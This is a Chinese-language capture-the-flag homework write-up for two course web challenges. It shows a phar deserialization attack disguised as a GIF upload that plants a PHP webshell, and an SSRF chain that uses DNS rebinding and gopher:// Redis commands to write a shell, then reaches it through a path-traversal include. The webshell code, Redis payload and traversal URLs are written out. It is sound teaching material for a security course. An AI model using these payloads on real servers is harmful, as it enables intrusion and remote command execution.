# HW6 writeup

## Rero Meme

### Problem

首先我們會看到登陸頁面

![](https://i.imgur.com/E8WaVbn.png)

輸入名字後可以看到一個分享迷因的頁面。

![](https://i.imgur.com/u6wnnkJ.png)

可以輸入迷因的標題以及上傳迷因。迷因似乎只接受 GIF 檔。

本題的原始碼是公開的。可以在課程網頁取得。

### Solution

以下是 `index.php` 的主要邏輯：
```php=
    <?php
    $user = NULL;
    if (isset($_POST['username']) || isset($_SESSION['username'])) {
        $user = new User($_POST['username'] ?? $_SESSION['username'], "images/");
    } else {
        include "login.html";
        exit;
    }

    if (isset($_FILES['meme'])) {
        if ($_FILES['meme']['error'] !== UPLOAD_ERR_OK)
            die("Upload error: error code=" . $_FILES['meme']['error']);

        $tmp_name = $_FILES['meme']['tmp_name'];
        if (exif_imagetype($tmp_name) === IMAGETYPE_GIF && preg_match("/[a-z0-9_\- ]+/i", $_POST['title'])) {
            $content = file_get_contents($tmp_name);
            $meme = new Meme($_POST['title'], $user, $content);
        } else {
            die("Invalid Meme.");
        }
        header("Location: /");
    }
    ?>
```
用力看可以發現幾個怪怪的地方：
1. `$user = new User($_POST['username'] ?? $_SESSION['username'], "images/");` 中 `$_POST['username']` 沒有過濾特殊字元 
2. `preg_match("/[a-z0-9_\- ]+/i", $_POST['title'])` 這樣寫的意思是至少有一個字元匹配 `[A-Za-z0-9_\- ]` 即可，這樣有過濾跟沒過濾一樣。

另外，我們看看 `libc.php` 的 `Meme` 類別：

```php=
class Meme
{
    public $title;
    public $author;
    public $filename;
    private $content = NULL;
    function __construct($title, $author, $content = NULL)
    {
        $this->title = $title;
        $this->author = $author;
        $this->content = $content;
        $this->filename = "images/$author/$title.gif";
    }
    function __destruct()
    {
        if ($this->content != NULL)
            file_put_contents($this->filename, $this->content);
    }
}
```

我們可以看到 `Meme` 類別有許多 magic method，馬上聯想到 deserialization 的漏洞。不過看來看去哪裡都沒有 `unserialize` 的程式碼出現，因此我們必須想其他辦法觸發 `unserialize` 。

我們剛剛提到 `$_POST['username']` 及 `$_POST['title']` 可以涵蓋特殊字元。因此，`$this->filename = "images/$author/$title.gif"` 是可控的。於是，我們可以將 `$title` 傳入 `attack.phar`，`$author` 隨便，叫 `yahallo` 好了。然後，我們精心構造 phar 檔想辦法去觸發 `Meme` 類別的 `unserialize`。如果可以觸發 `unserialize`，`Meme` 類別的
`$this->title`、`$this->author`、`$this->content`、以及 `$this->filename` 都將是可控的。

不過，有一個限制是必須繞過的。`exif_imagetype($tmp_name) === IMAGETYPE_GIF` 會檢查 magic number。而 GIF 的 magic number 是 GIF89a 或 GIF87a。因此，phar 檔的前 6 個 byte 必須符合 GIF89a 或 GIF87a。

除此之外，伺服器的 `image` 目錄是可寫的，因此我希望 unserialize 的 Meme class 可以寫入 PHP webshell。於是我們必須設定將 `$this->filename` 設為 `/var/www/html/images/yahallo/shell.php`，`$this->content` 設為 `<?= system($_GET["a"]) ?>`。

詳細的 phar 製作程式碼參閱 `make_pharfile.php`，用法如下：
```bash
php make_pharfile.php
```

執行完後會產出一個 phar file `attack.phar.gif`。接著，將精心設計好的 phar 檔 `attack.phar.gif` 上傳到 `images/yahallo` 中。server 沒有檢查上傳檔案的副檔名，因此上傳檔案的名字不重要，重點是 meme title 要是 `attack.phar`，這樣 server 才會幫你存成 `attack.phar.gif`。(實驗證實 `phar://` protocol 會將 `attack.phar.gif` 當成是 phar 喔)：

![](https://i.imgur.com/iZY05tu.png)

接下來，想辦法觸發 `unserialize`。想了很久都想不到，後來實驗許久後發現 `is_dir` 會觸發 `unserialize`，(我太菜了 Orz)。看看 User 類別：
```php=
class User
{
    public $username;
    function __construct($username, $directory=".") {
        chdir($directory);
        if(!is_dir($username)) mkdir($username);
        $this->username = $_SESSION['username'] = $username;
        chdir($_SERVER["DOCUMENT_ROOT"]);
    }
    function __toString()
    {
        return htmlentities($this->username);
    }
}
```
既然 `$username` 可控，且可以含有特殊字元，把 `$username` 設成 `phar:///var/www/html/images/yahallo/attack.phar.gif` 即可。因此，把 cookie 刪掉重新登入，以 `phar:///var/www/html/images/yahallo/attack.phar.gif` 這個使用者登入：

![](https://i.imgur.com/37wJZ9t.png)

理論上 `unserialize` 應該要被觸發了。

看看 `images/yahallo/shell.php?a=id` 有沒有東西：

![](https://i.imgur.com/ZeWbjsu.png)

可行！
看看 `ls /`：

![](https://i.imgur.com/5lGPeIe.png)

把 flag 倒出來：

![](https://i.imgur.com/cPjoq0k.png)

## 六十四基底編碼之遠端圖像編碼器
### Description
本題為一個 base64 圖片加密的服務，輸入網址後會把網頁 curl 下來，做 base64 加密後，將圖片輸出。

### Solution
粉明顯的 SSRF。輸入 `file:///var/www/html/index.php` 就可以拿到原始碼了。

![](https://i.imgur.com/hoetrUs.png)
![](https://i.imgur.com/dAkB0lw.png)


另外，每次都要 base64 decode 好煩，於是我寫了一個 PHP script 幫我做自動化的工作。參閱 `base64.php`。用法如下：

```bash
php base64.php <url>
```

看一下 `index.php`：
```php=
<?php
// You find the source code? Cool.
// It's time to find the other service on *this* server.
// Again, you still shouldn't scan me :/
...
<div class="content article-body">
<?php
    $page = str_replace("../", "", $_GET['page'] ?? 'home');
    include("page/$page.inc.php");
?>
</div>
```
大部分程式碼不重要，重點有兩個：一是 comment 提醒我們還有其他服務是開啟的。二是發現還有一個檔案 `page/result.inc.php`，十之八九是處理 curling 的程式，一並把它拉下來。

仔細看看 `result.inc.php` ：

```php=
<?php
if ($url = @$_POST['url'])) {
    if ($hostname = parse_url($url)['host']) {
        $ip = gethostbyname($hostname);
        $ip_part = explode(".", $ip);
        if (count($ip_part) !== 4 || in_array($ip_part[0], ['192', '172', '10', '127']))
            die("Invalid hostname.");
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $b64_img = base64_encode(curl_exec($ch));
    echo curl_error($ch) ? curl_error($ch) : "<img src=\"data:image/jpeg;base64,$b64_img\">";
    curl_close($ch);
}
...
```
看到第 6 行：
```php
if (count($ip_part) !== 4 || in_array($ip_part[0], ['192', '172', '10', '127']))
```
它會檢查 IP 是否為內網或 localhost。乍看之下無從可解。不過，第 16 行又帶來曙光：
```php
curl_setopt($ch, CURLOPT_URL, $url);
```
這裡，我們可以看到它使用的不是 `$ip` 而是 `$url`，因此它又會去戳 name server 而多解析一次。於是，我們可以用 DNS rebinding attack 去讓 server 前後解析出不同的 IP。如果第一次解析出隨變一個 public IP，第二次解析出 127.0.0.1，那我們就可以繞過 IP 的限制訪問 localhost。`rebind.network` 提共了一個 poc 的 DNS server 給我們使用 DNS rebinding 攻擊。我使用的 domain 是：
```
a.54.248.150.115.1time.127.0.0.1.1times.repeat.rebind.network
```
這樣有一半的機率會解析到 54.248.150.115，一半會解析到 127.0.0.1。

DNS rebinding 的部分做完了。接下來，我想看看哪些服務是開啟的。想看哪些服務是開啟的方法是爆搜 pid 偷看 `proc/<pid>/cmdline` ，這樣可以看一些常駐服務的 command。爆搜法很麻煩，因此寫成 script。參閱 `brute_force_services.php`。使用方法如下：
```bash
php brute_force_services.php
```
結果：
```
int(1)
string(18) "/bin/sh/start.sh"
int(14)
string(44) "/usr/bin/redis-server 127.0.0.1:27134"
int(15)
string(21) "apache2-DFOREGROUND"
int(16)
string(44) "/usr/bin/redis-server 127.0.0.1:27134"
int(17)
string(44) "/usr/bin/redis-server 127.0.0.1:27134"
int(18)
string(44) "/usr/bin/redis-server 127.0.0.1:27134"
int(29)
string(21) "apache2-DFOREGROUND"
int(31)
string(21) "apache2-DFOREGROUND"
int(33)
string(21) "apache2-DFOREGROUND"
...
```
redis 似乎是開啟的。

這裡，果我們想和 redis server 溝通的話，可以使用 `gopher://` protocol (課堂有講到)。既然我們能跟 redis server 溝通了，我們可以下以下的命令讓 redis 在 `/tmp` 生出一個 php shell：
```
FLUSHALL
SET shell "<?php system($shell_cmd) ?>"\r
CONFIG SET DIR /tmp\r
CONFIG SET DBFILENAME lol.inc.php\r
SAVE\r
QUIT\r
EOF;
```

不過，由於一些限制 ( 待會說到 )，我沒法寫出完整的 PHP shell，只能生成執行單一指令的 PHP 檔。 參閱 `redis.php`。`redis.php`能生成我們需要的與 redis 溝通的 gopher protocol 的 payload。使用方法如下：
```bash
php redis.php <shell_cmd>
```

先試試 `ls /`：
```bash
user@kali:~$ php base64.php `php redis.php "ls /"`
+OK
+OK
+OK
+OK
+OK
+OK
```
多試幾次應該就成功把 PHP shell 寫到了 `/tmp/lol.inc.php` 內了。寫到 `lol.inc.php` 的原因一樣待會會說明。

再來，我們要試著訪問 `/tmp/lol.inc.php`。沒法子了後就回頭看看前面的 code：

```php
<div class="content article-body">
<?php
    $page = str_replace("../", "", $_GET['page'] ?? 'home');
    include("page/$page.inc.php");
?>
</div>
```
這邊有過濾 `../`，但過濾的方法很好繞過，基本上如果給 `....//`，`str_replace` 完的結果一樣會是 `../`。不過，後面的 extension 基本上不能繞過。NULL byte 截斷試了好幾次都無效。( 這也是為甚麼我存入 `lol.inc.php` 的原因，還有為甚麼我沒辦法寫出完整的 PHP shell的原因 )。總之，訪問 `http://base64image.splitline.tw:8894/?page=....//....//....//....///tmp/lol` 就能看到有趣的東西了：

```
user@kali:~$ php base64.php http://base64image.splitline.tw:8894/?page=....//....//....//....///tmp/lol
...
                        <div class="content article-body">
                            REDIS0009�	redis-ver5.0.3�
redis-bits�@�ctime��*�_used-mem��_�
                                   aof-preamble���shellbin
boot
dev
etc
flag_LgqcHFhUFlwEmZ6jZ1zMzqfasc8SjaSw
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var
�.� z^�                        </div>
...
```

重新做一遍類似的事情，把 shell command 換生成 `cat /flag_LgqcHFhUFlwEmZ6jZ1zMzqfasc8SjaSw` ，應該就能拿到 flag 了：
```bash
user@kali:~$ php base64.php `php redis.php "cat /flag_LgqcHFhUFlwEmZ6jZ1zMzqfasc8SjaSw"`
+OK
+OK
+OK
+OK
+OK
+OK
user@kali:~$ php base64.php http://base64image.splitline.tw:8894/?page=....//....//....//....///tmp/lol

...
<div class="content article-body">
                            REDIS0009�	redis-ver5.0.3�
redis-bits�@�ctime-�_used-mem�`�
                                aof-preamble���shell=FLAG{data:text/flag;r3d1s-s3rv3r}
�����Wff                        </div>

...
```

更新：Null byte injection is fixed in PHP > 5.3 ([source](https://bugs.php.net/bug.php?id=39863))
